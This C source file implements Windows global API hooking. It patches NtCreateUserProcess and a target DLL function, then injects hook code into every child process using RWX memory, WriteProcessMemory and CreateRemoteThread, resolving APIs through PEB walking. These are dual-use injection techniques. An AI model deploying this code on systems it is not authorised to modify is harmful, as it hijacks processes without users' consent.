#include <windows.h>
#include <windef.h>
#include <winnt.h>
#include "HookFunction.h"
#include "Common.h"

#ifdef _WIN64

NTSTATUS NTAPI NewNtCreateUserProcess(PHANDLE ProcessHandle, PHANDLE ThreadHandle, ACCESS_MASK ProcessDesiredAccess, ACCESS_MASK ThreadDesiredAccess, POBJECT_ATTRIBUTES ProcessObjectAttributes, POBJECT_ATTRIBUTES ThreadObjectAttributes, ULONG ProcessFlags, ULONG ThreadFlags, PRTL_USER_PROCESS_PARAMETERS ProcessParameters, void *CreateInfo, void *AttributeList)
{
    WINAPI_GLOBAL_HOOK_DATAA LWHD;
    PWINAPI_GLOBAL_HOOK_DATAA PLWHD;
    PVOID lpLWHD;
    HANDLE hThread;
    BOOL IsWow64Process_check;
    PLWHD = 0xCCCCCCCCCCCCCCCC;

    NTSTATUS ret = ((NTCREATEUSERPROCESS)PLWHD->NtCreateUserProcess)(ProcessHandle, ThreadHandle, ProcessDesiredAccess, ThreadDesiredAccess, ProcessObjectAttributes, ThreadObjectAttributes, ProcessFlags, ThreadFlags, ProcessParameters, CreateInfo, AttributeList);

    ((ISWOW64PROCESS)PLWHD->FPL.PIsWow64Process)(*ProcessHandle, &IsWow64Process_check);

    if (IsWow64Process_check)
    {
        return ret;
    }

    //=====================================================
    LWHD.lpNewFunction = PLWHD->lpNewFunctionEx;
    LWHD.lpNewNtCreateUserProcess = PLWHD->lpNewNtCreateUserProcessEx;
    LWHD.lpHooking = PLWHD->lpHookingEx;
    LWHD.lpParameter = PLWHD->lpParameterEx;
    LWHD.dwSizeNewFunction = PLWHD->dwSizeNewFunction;
    LWHD.dwSizeNewNtCreateUserProcess = PLWHD->dwSizeNewNtCreateUserProcess;
    LWHD.dwSizeHooking = PLWHD->dwSizeHooking;
    LWHD.dwSizeParameter = PLWHD->dwSizeParameter;
    LWHD.dwSizeDll = PLWHD->dwSizeDll;
    LWHD.CopyOrigin_Parameter_Offset = PLWHD->CopyOrigin_Parameter_Offset;
    LWHD.NewFuncton_Struct_Offset = PLWHD->NewFuncton_Struct_Offset;
    LWHD.NtCreateUserProcess_Struct_Offset = PLWHD->NtCreateUserProcess_Struct_Offset;
    LWHD.Origin_Function_Offset = PLWHD->Origin_Function_Offset;
    LWHD.Parameter = PLWHD->Parameter;
    LWHD.GetProcAddress_Offset = PLWHD->GetProcAddress_Offset;
    ((MEMCPY)PLWHD->FPL.Pmemcpy)(LWHD.NtCreateUserProcess, PLWHD->NtCreateUserProcess, sizeof(NtCreateUserProcess));
    ((MEMCPY)PLWHD->FPL.Pmemcpy)(LWHD.JmpInstruction, PLWHD->JmpInstruction, sizeof(PLWHD->JmpInstruction));
    ((MEMCPY)PLWHD->FPL.Pmemcpy)(LWHD.DllName, PLWHD->DllName, sizeof(LWHD.DllName));
    ((MEMCPY)PLWHD->FPL.Pmemcpy)(LWHD.DefaultDll, PLWHD->DefaultDll, sizeof(LWHD.DefaultDll));
    ((MEMCPY)PLWHD->FPL.Pmemcpy)(LWHD.Function_Name_List, PLWHD->Function_Name_List, sizeof(LWHD.Function_Name_List));
    //=====================================================
    LWHD.lpCopyBaseOfCode = ((VIRTUALALLOCEX)PLWHD->FPL.PVirtualAllocEx)(*ProcessHandle, NULL, LWHD.dwSizeDll, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    LWHD.lpNewFunctionEx = ((VIRTUALALLOCEX)PLWHD->FPL.PVirtualAllocEx)(*ProcessHandle, NULL, LWHD.dwSizeNewFunction, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    LWHD.lpNewNtCreateUserProcessEx = ((VIRTUALALLOCEX)PLWHD->FPL.PVirtualAllocEx)(*ProcessHandle, NULL, LWHD.dwSizeNewNtCreateUserProcess, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    LWHD.lpHookingEx = ((VIRTUALALLOCEX)PLWHD->FPL.PVirtualAllocEx)(*ProcessHandle, NULL, LWHD.dwSizeHooking, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    lpLWHD = ((VIRTUALALLOCEX)PLWHD->FPL.PVirtualAllocEx)(*ProcessHandle, NULL, sizeof(WINAPI_GLOBAL_HOOK_DATAA), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (PLWHD->Parameter)
    {
        LWHD.lpParameterEx = ((VIRTUALALLOCEX)PLWHD->FPL.PVirtualAllocEx)(*ProcessHandle, NULL, LWHD.dwSizeParameter, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    }
    //=====================================================
    if (((WRITEPROCESSMEMORY)PLWHD->FPL.PWriteProcessMemory)(*ProcessHandle, LWHD.lpHookingEx, LWHD.lpHooking, LWHD.dwSizeHooking, NULL) == FALSE)
    {
        return FALSE;
    }

    if (((WRITEPROCESSMEMORY)PLWHD->FPL.PWriteProcessMemory)(*ProcessHandle, lpLWHD, &LWHD, sizeof(WINAPI_GLOBAL_HOOK_DATAA), NULL) == FALSE)
    {
        return FALSE;
    }

    if (((WRITEPROCESSMEMORY)PLWHD->FPL.PWriteProcessMemory)(*ProcessHandle, LWHD.lpNewFunctionEx, LWHD.lpNewFunction, LWHD.dwSizeNewFunction, NULL) == FALSE)
    {
        return FALSE;
    }

    if (((WRITEPROCESSMEMORY)PLWHD->FPL.PWriteProcessMemory)(*ProcessHandle, LWHD.lpNewNtCreateUserProcessEx, LWHD.lpNewNtCreateUserProcess, LWHD.dwSizeNewNtCreateUserProcess, NULL) == FALSE)
    {
        return FALSE;
    }

    if (PLWHD->Parameter)
    {
        if (((WRITEPROCESSMEMORY)PLWHD->FPL.PWriteProcessMemory)(*ProcessHandle, LWHD.lpParameterEx, LWHD.lpParameter, LWHD.dwSizeParameter, NULL) == FALSE)
        {
            return FALSE;
        }
    }

    hThread = ((CREATEREMOTETHREAD)PLWHD->FPL.PCreateRemoteThread)(*ProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)LWHD.lpHookingEx, lpLWHD, 0, NULL);
    // ((WAITFORSINGLEOBJECT)PLWHD->FPL.PWaitForSingleObject)(hThread, INFINITE);
    // ResumeThread(*ThreadHandle);
    // *ThreadHandle = hThread;

    return ret;
}

int Hooking(PWINAPI_GLOBAL_HOOK_DATAA Data)
{
    HMODULE kernel32, ntdll, hModule;
    Address PEB = NULL;
    PVOID Ldr = NULL, Current = NULL, Origin_Function = NULL, Copy_Origin_Function = NULL;
    DWORD dwOldProtect;
    //====================Get PEB Structure Pointer====================
    asm("mov rax, qword ptr gs:[0x30]");
    asm("mov rax, qword ptr ds:[rax + 0x60]"
        : "=r"(PEB));
    //===================Get PEB_LDR_DATA Structure====================
    Ldr = *(Address *)(PEB + 0x18);
    //=====Get Address "PEB_LDR_DATA->InLoadOrderModuleList.Flink"=====
    Ldr = (Address)Ldr + 0x10;
    //======================Dereference Ldr Value======================
    Current = *(Address *)Ldr;
    while (Ldr != Current)
    {
        wchar_t s1, s2;
        BOOL ret = TRUE;
        //=====Compare module name with LDR_DATA_TABLE_ENTRI base name=====
        for (int i = 0; (*(Data->DefaultDll[0] + i) != 0 && *(*(WCHAR **)((Address)Current + 0x60) + i) != 0); i++)
        {
            s1 = (*(Data->DefaultDll[0] + i) >= 65 && *(Data->DefaultDll[0] + i) <= 90) ? *(Data->DefaultDll[0] + i) + 32 : *(Data->DefaultDll[0] + i);
            s2 = (*(*(WCHAR **)((Address)Current + 0x60) + i) >= 65 && *(*(WCHAR **)((Address)Current + 0x60) + i) <= 90) ? *(*(WCHAR **)((Address)Current + 0x60) + i) + 32 : *(*(WCHAR **)((Address)Current + 0x60) + i);
            ret = (s1 == s2) ? TRUE : FALSE;
            if (ret == FALSE)
                break;
        }
        if (ret)
            break;
        //printf("%S : %p\n", *(Address*)((Address)Current + 0x30), *(Address*)((Address)Current + 0x18));
        //=======Get Value PEB_LDR_DATA->InLoadOrderModuleList.Flink=======
        Current = *(Address *)Current;
    }
    //==================Get "GetProcAddress" function==================
    Data->FPL.PGetProcAddress = (Address) * (Address *)((Address)Current + 0x30) + (Address)Data->GetProcAddress_Offset;
    //==================Get kernel32.dll Base Address==================
    kernel32 = *(Address *)((Address)Current + 0x30);
    //================Get kernel32.dll functions address===============
    Data->FPL.POpenProcess = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(kernel32, Data->Function_Name_List[2]);
    Data->FPL.PVirtualProtect = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(kernel32, Data->Function_Name_List[3]);
    Data->FPL.PVirtualAllocEx = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(kernel32, Data->Function_Name_List[4]);
    Data->FPL.PWriteProcessMemory = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(kernel32, Data->Function_Name_List[5]);
    Data->FPL.PCreateRemoteThread = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(kernel32, Data->Function_Name_List[6]);
    Data->FPL.PWaitForSingleObject = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(kernel32, Data->Function_Name_List[7]);
    Data->FPL.PLoadLibraryA = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(kernel32, Data->Function_Name_List[8]);
    Data->FPL.PIsWow64Process = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(kernel32, Data->Function_Name_List[9]);
    //====================Get ntdll.dll Base Address===================
    ntdll = ((LOADLIBRARYA)Data->FPL.PLoadLibraryA)(Data->DefaultDll[1]);
    //=================Get ntdll.dll functions address=================
    Data->FPL.Pmemcpy = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(ntdll, Data->Function_Name_List[0]);
    Data->FPL.PNtCreateUserProcess = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(ntdll, Data->Function_Name_List[1]);
    //================Set kiServiceTable function index================
    ((MEMCPY)Data->FPL.Pmemcpy)(Data->NtCreateUserProcess, Data->FPL.PNtCreateUserProcess, 16);
    if (Data->Parameter)
    {
        //================Set NewFunction Parameter Address================
        ((MEMCPY)Data->FPL.Pmemcpy)((Address)Data->lpNewFunctionEx + Data->NewFuncton_Struct_Offset, &Data->lpParameterEx, sizeof(Address));
    }
    //==============Set NtCreateUserProcess PLWHD Address==============
    ((MEMCPY)Data->FPL.Pmemcpy)((Address)Data->lpNewNtCreateUserProcessEx + Data->NtCreateUserProcess_Struct_Offset, &Data, sizeof(Address));
    //=========================Load target DLL=========================
    hModule = ((LOADLIBRARYA)Data->FPL.PLoadLibraryA)(Data->DllName);
    if (hModule == NULL)
    {
        return FALSE;
    }

    //===============Target Function Address Calculation===============
    Origin_Function = (Address)hModule + Data->Origin_Function_Offset;
    Copy_Origin_Function = (Address)Data->lpCopyBaseOfCode + Data->Origin_Function_Offset;
    //==========================DLL data copy==========================
    ((MEMCPY)Data->FPL.Pmemcpy)((Address)Data->lpCopyBaseOfCode, (Address)hModule, Data->dwSizeDll);
    if (Data->Parameter)
    {
        //======Write replicated function address in user parameters=======
        ((MEMCPY)Data->FPL.Pmemcpy)((Address)Data->lpParameterEx + Data->CopyOrigin_Parameter_Offset, &Copy_Origin_Function, sizeof(Address));
    }
    do
    {
        //===============Writing address in Jump Instruction===============
        ((MEMCPY)Data->FPL.Pmemcpy)(&Data->JmpInstruction[ASM_ARRAY_JMP_INDEX], &Data->lpNewFunctionEx, sizeof(Address));
        //=====================Target function hooking=====================
        if (((VIRTUALPROTECT)Data->FPL.PVirtualProtect)(Origin_Function, sizeof(Data->JmpInstruction), PAGE_EXECUTE_READWRITE, &dwOldProtect) == FALSE)
        {
            return FALSE;
        }

        ((MEMCPY)Data->FPL.Pmemcpy)(Origin_Function, Data->JmpInstruction, sizeof(Data->JmpInstruction));

        if (((VIRTUALPROTECT)Data->FPL.PVirtualProtect)(Origin_Function, sizeof(Data->JmpInstruction), dwOldProtect, &dwOldProtect) == FALSE)
        {
            return FALSE;
        }
        //================Writing address in Jump Instruction==============
        ((MEMCPY)Data->FPL.Pmemcpy)(&Data->JmpInstruction[ASM_ARRAY_JMP_INDEX], &Data->lpNewNtCreateUserProcessEx, sizeof(Address));
        //===============NtCreateUserProcess Function Hooking==============
        if (((VIRTUALPROTECT)Data->FPL.PVirtualProtect)(Data->FPL.PNtCreateUserProcess, sizeof(Data->JmpInstruction), PAGE_EXECUTE_READWRITE, &dwOldProtect) == FALSE)
        {
            return FALSE;
        }

        ((MEMCPY)Data->FPL.Pmemcpy)(Data->FPL.PNtCreateUserProcess, Data->JmpInstruction, sizeof(Data->JmpInstruction));

        if (((VIRTUALPROTECT)Data->FPL.PVirtualProtect)(Data->FPL.PNtCreateUserProcess, sizeof(Data->JmpInstruction), dwOldProtect, &dwOldProtect) == FALSE)
        {
            return FALSE;
        }
    } while ((*(BYTE *)Origin_Function != 0x48) && (*(BYTE *)Data->FPL.PNtCreateUserProcess != 0x48));

    return TRUE;
}
#else

NTSTATUS NTAPI NewNtCreateUserProcess(PHANDLE ProcessHandle, PHANDLE ThreadHandle, ACCESS_MASK ProcessDesiredAccess, ACCESS_MASK ThreadDesiredAccess, POBJECT_ATTRIBUTES ProcessObjectAttributes, POBJECT_ATTRIBUTES ThreadObjectAttributes, ULONG ProcessFlags, ULONG ThreadFlags, PRTL_USER_PROCESS_PARAMETERS ProcessParameters, void *CreateInfo, void *AttributeList)
{
    WINAPI_GLOBAL_HOOK_DATAA LWHD;
    PWINAPI_GLOBAL_HOOK_DATAA PLWHD;
    PVOID lpLWHD;
    HANDLE hThread;
    PLWHD = 0xCCCCCCCC;

    NTSTATUS ret = ((NTCREATEUSERPROCESS)PLWHD->NtCreateUserProcess)(ProcessHandle, ThreadHandle, ProcessDesiredAccess, ThreadDesiredAccess, ProcessObjectAttributes, ThreadObjectAttributes, ProcessFlags, ThreadFlags, ProcessParameters, CreateInfo, AttributeList);

    //=====================================================
    LWHD.lpNewFunction = PLWHD->lpNewFunctionEx;
    LWHD.lpNewNtCreateUserProcess = PLWHD->lpNewNtCreateUserProcessEx;
    LWHD.lpHooking = PLWHD->lpHookingEx;
    LWHD.lpParameter = PLWHD->lpParameterEx;
    LWHD.dwSizeNewFunction = PLWHD->dwSizeNewFunction;
    LWHD.dwSizeNewNtCreateUserProcess = PLWHD->dwSizeNewNtCreateUserProcess;
    LWHD.dwSizeHooking = PLWHD->dwSizeHooking;
    LWHD.dwSizeParameter = PLWHD->dwSizeParameter;
    LWHD.dwSizeDll = PLWHD->dwSizeDll;
    LWHD.CopyOrigin_Parameter_Offset = PLWHD->CopyOrigin_Parameter_Offset;
    LWHD.NewFuncton_Struct_Offset = PLWHD->NewFuncton_Struct_Offset;
    LWHD.NtCreateUserProcess_Struct_Offset = PLWHD->NtCreateUserProcess_Struct_Offset;
    LWHD.Origin_Function_Offset = PLWHD->Origin_Function_Offset;
    LWHD.Parameter = PLWHD->Parameter;
    LWHD.GetProcAddress_Offset = PLWHD->GetProcAddress_Offset;
    ((MEMCPY)PLWHD->FPL.Pmemcpy)(LWHD.NtCreateUserProcess, PLWHD->NtCreateUserProcess, sizeof(NtCreateUserProcess));
    ((MEMCPY)PLWHD->FPL.Pmemcpy)(LWHD.JmpInstruction, PLWHD->JmpInstruction, sizeof(JmpInstruction));
    ((MEMCPY)PLWHD->FPL.Pmemcpy)(LWHD.DllName, PLWHD->DllName, sizeof(LWHD.DllName));
    ((MEMCPY)PLWHD->FPL.Pmemcpy)(LWHD.DefaultDll, PLWHD->DefaultDll, sizeof(LWHD.DefaultDll));
    ((MEMCPY)PLWHD->FPL.Pmemcpy)(LWHD.Function_Name_List, PLWHD->Function_Name_List, sizeof(LWHD.Function_Name_List));
    //=====================================================
    LWHD.lpCopyBaseOfCode = ((VIRTUALALLOCEX)PLWHD->FPL.PVirtualAllocEx)(*ProcessHandle, NULL, LWHD.dwSizeDll, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    LWHD.lpNewFunctionEx = ((VIRTUALALLOCEX)PLWHD->FPL.PVirtualAllocEx)(*ProcessHandle, NULL, LWHD.dwSizeNewFunction, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    LWHD.lpNewNtCreateUserProcessEx = ((VIRTUALALLOCEX)PLWHD->FPL.PVirtualAllocEx)(*ProcessHandle, NULL, LWHD.dwSizeNewNtCreateUserProcess, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    LWHD.lpHookingEx = ((VIRTUALALLOCEX)PLWHD->FPL.PVirtualAllocEx)(*ProcessHandle, NULL, LWHD.dwSizeHooking, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    lpLWHD = ((VIRTUALALLOCEX)PLWHD->FPL.PVirtualAllocEx)(*ProcessHandle, NULL, sizeof(WINAPI_GLOBAL_HOOK_DATAA), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if(PLWHD->Parameter)
    {
        LWHD.lpParameterEx = ((VIRTUALALLOCEX)PLWHD->FPL.PVirtualAllocEx)(*ProcessHandle, NULL, LWHD.dwSizeParameter, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    }
    //=====================================================
    if (((WRITEPROCESSMEMORY)PLWHD->FPL.PWriteProcessMemory)(*ProcessHandle, LWHD.lpHookingEx, LWHD.lpHooking, LWHD.dwSizeHooking, NULL) == FALSE)
    {
        return FALSE;
    }

    if (((WRITEPROCESSMEMORY)PLWHD->FPL.PWriteProcessMemory)(*ProcessHandle, lpLWHD, &LWHD, sizeof(WINAPI_GLOBAL_HOOK_DATAA), NULL) == FALSE)
    {
        return FALSE;
    }

    if (((WRITEPROCESSMEMORY)PLWHD->FPL.PWriteProcessMemory)(*ProcessHandle, LWHD.lpNewFunctionEx, LWHD.lpNewFunction, LWHD.dwSizeNewFunction, NULL) == FALSE)
    {
        return FALSE;
    }

    if (((WRITEPROCESSMEMORY)PLWHD->FPL.PWriteProcessMemory)(*ProcessHandle, LWHD.lpNewNtCreateUserProcessEx, LWHD.lpNewNtCreateUserProcess, LWHD.dwSizeNewNtCreateUserProcess, NULL) == FALSE)
    {
        return FALSE;
    }

    if (PLWHD->Parameter)
    {
        if (((WRITEPROCESSMEMORY)PLWHD->FPL.PWriteProcessMemory)(*ProcessHandle, LWHD.lpParameterEx, LWHD.lpParameter, LWHD.dwSizeParameter, NULL) == FALSE)
        {
            return FALSE;
        }
    }

    hThread = ((CREATEREMOTETHREAD)PLWHD->FPL.PCreateRemoteThread)(*ProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)LWHD.lpHookingEx, lpLWHD, 0, NULL);
    // ((WAITFORSINGLEOBJECT)PLWHD->FPL.PWaitForSingleObject)(hThread, INFINITE);
    // ResumeThread(*ThreadHandle);
    // *ThreadHandle = hThread;

    return ret;
}

int Hooking(PWINAPI_GLOBAL_HOOK_DATAA Data)
{
    HMODULE kernel32, ntdll, hModule;
    Address PEB = NULL;
    PVOID Ldr = NULL, Current = NULL, Origin_Function = NULL, Copy_Origin_Function = NULL;
    DWORD dwOldProtect;
    //====================Get PEB Structure Pointer====================
    asm(
        "mov eax, fs: [0x30]"
        : "=r"(PEB));
    //===================Get PEB_LDR_DATA Structure====================
    Ldr = *(Address *)(PEB + 0xC);
    //=====Get Address "PEB_LDR_DATA->InLoadOrderModuleList.Flink"=====
    Ldr = (Address)Ldr + 0xC;
    //======================Dereference Ldr Value======================
    Current = *(Address *)Ldr;
    while (Ldr != Current)
    {
        wchar_t s1, s2;
        BOOL ret = TRUE;
        //=====Compare module name with LDR_DATA_TABLE_ENTRI base name=====
        for (int i = 0; (*(Data->DefaultDll[0] + i) != 0 && *(*(WCHAR **)((Address)Current + 0x30) + i) != 0); i++)
        {
            s1 = (*(Data->DefaultDll[0] + i) >= 65 && *(Data->DefaultDll[0] + i) <= 90) ? *(Data->DefaultDll[0] + i) + 32 : *(Data->DefaultDll[0] + i);
            s2 = (*(*(WCHAR **)((Address)Current + 0x30) + i) >= 65 && *(*(WCHAR **)((Address)Current + 0x30) + i) <= 90) ? *(*(WCHAR **)((Address)Current + 0x30) + i) + 32 : *(*(WCHAR **)((Address)Current + 0x30) + i);
            ret = (s1 == s2) ? TRUE : FALSE;
            if (ret == FALSE)
                break;
        }
        if (ret)
            break;
        //printf("%S : %p\n", *(Address*)((Address)Current + 0x30), *(Address*)((Address)Current + 0x18));
        //=======Get Value PEB_LDR_DATA->InLoadOrderModuleList.Flink=======
        Current = *(Address *)Current;
    }
    //==================Get "GetProcAddress" function==================
    Data->FPL.PGetProcAddress = (Address) * (Address *)((Address)Current + 0x18) + (Address)Data->GetProcAddress_Offset;
    //==================Get kernel32.dll Base Address==================
    kernel32 = *(Address *)((Address)Current + 0x18);
    //================Get kernel32.dll functions address===============
    Data->FPL.POpenProcess = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(kernel32, Data->Function_Name_List[2]);
    Data->FPL.PVirtualProtect = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(kernel32, Data->Function_Name_List[3]);
    Data->FPL.PVirtualAllocEx = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(kernel32, Data->Function_Name_List[4]);
    Data->FPL.PWriteProcessMemory = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(kernel32, Data->Function_Name_List[5]);
    Data->FPL.PCreateRemoteThread = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(kernel32, Data->Function_Name_List[6]);
    Data->FPL.PWaitForSingleObject = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(kernel32, Data->Function_Name_List[7]);
    Data->FPL.PLoadLibraryA = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(kernel32, Data->Function_Name_List[8]);
    //====================Get ntdll.dll Base Address===================
    ntdll = ((LOADLIBRARYA)Data->FPL.PLoadLibraryA)(Data->DefaultDll[1]);
    //=================Get ntdll.dll functions address=================
    Data->FPL.Pmemcpy = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(ntdll, Data->Function_Name_List[0]);
    Data->FPL.PNtCreateUserProcess = ((GETPROCADDRESS)Data->FPL.PGetProcAddress)(ntdll, Data->Function_Name_List[1]);
    //===================Set Wow64Transition Address===================
    ((MEMCPY)Data->FPL.Pmemcpy)(Data->NtCreateUserProcess, Data->FPL.PNtCreateUserProcess, 10);
    if (Data->Parameter)
    {
        //================Set NewFunction Parameter Address================
        ((MEMCPY)Data->FPL.Pmemcpy)((Address)Data->lpNewFunctionEx + Data->NewFuncton_Struct_Offset, &Data->lpParameterEx, sizeof(Address));
    }    
    //==============Set NtCreateUserProcess PLWHD Address==============
    ((MEMCPY)Data->FPL.Pmemcpy)((Address)Data->lpNewNtCreateUserProcessEx + Data->NtCreateUserProcess_Struct_Offset, &Data, sizeof(Address));
    //=========================Load target DLL=========================
    hModule = ((LOADLIBRARYA)Data->FPL.PLoadLibraryA)(Data->DllName);

    if (hModule == NULL)
    {
        return FALSE;
    }

    //===============Target Function Address Calculation===============
    Origin_Function = (Address)hModule + Data->Origin_Function_Offset;
    Copy_Origin_Function = (Address)Data->lpCopyBaseOfCode + Data->Origin_Function_Offset;
    //==========================DLL data copy==========================
    ((MEMCPY)Data->FPL.Pmemcpy)((Address)Data->lpCopyBaseOfCode, (Address)hModule, Data->dwSizeDll);
    if (Data->Parameter)
    {
        //======Write replicated function address in user parameters=======
        ((MEMCPY)Data->FPL.Pmemcpy)((Address)Data->lpParameterEx + Data->CopyOrigin_Parameter_Offset, &Copy_Origin_Function, sizeof(Address));
    }
    do
    {
        //===============Writing address in Jump Instruction===============
        ((MEMCPY)Data->FPL.Pmemcpy)(&Data->JmpInstruction[ASM_ARRAY_JMP_INDEX], &Data->lpNewFunctionEx, sizeof(Address));
        //=====================Target function hooking=====================
        if (((VIRTUALPROTECT)Data->FPL.PVirtualProtect)(Origin_Function, sizeof(Data->JmpInstruction), PAGE_EXECUTE_READWRITE, &dwOldProtect) == FALSE)
        {
            return FALSE;
        }

        ((MEMCPY)Data->FPL.Pmemcpy)(Origin_Function, Data->JmpInstruction, sizeof(Data->JmpInstruction));

        if (((VIRTUALPROTECT)Data->FPL.PVirtualProtect)(Origin_Function, sizeof(Data->JmpInstruction), dwOldProtect, &dwOldProtect) == FALSE)
        {
            return FALSE;
        }
        //================Writing address in Jump Instruction==============
        ((MEMCPY)Data->FPL.Pmemcpy)(&Data->JmpInstruction[ASM_ARRAY_JMP_INDEX], &Data->lpNewNtCreateUserProcessEx, sizeof(Address));
        //===============NtCreateUserProcess Function Hooking==============
        if (((VIRTUALPROTECT)Data->FPL.PVirtualProtect)(Data->FPL.PNtCreateUserProcess, sizeof(Data->JmpInstruction), PAGE_EXECUTE_READWRITE, &dwOldProtect) == FALSE)
        {
            return FALSE;
        }

        ((MEMCPY)Data->FPL.Pmemcpy)(Data->FPL.PNtCreateUserProcess, Data->JmpInstruction, sizeof(Data->JmpInstruction));

        if (((VIRTUALPROTECT)Data->FPL.PVirtualProtect)(Data->FPL.PNtCreateUserProcess, sizeof(Data->JmpInstruction), dwOldProtect, &dwOldProtect) == FALSE)
        {
            return FALSE;
        }
    } while ((*(BYTE *)Origin_Function != 0xb8) && (*(BYTE *)Data->FPL.PNtCreateUserProcess != 0xb8));

    return TRUE;
}
#endif

int AtherFunc(){};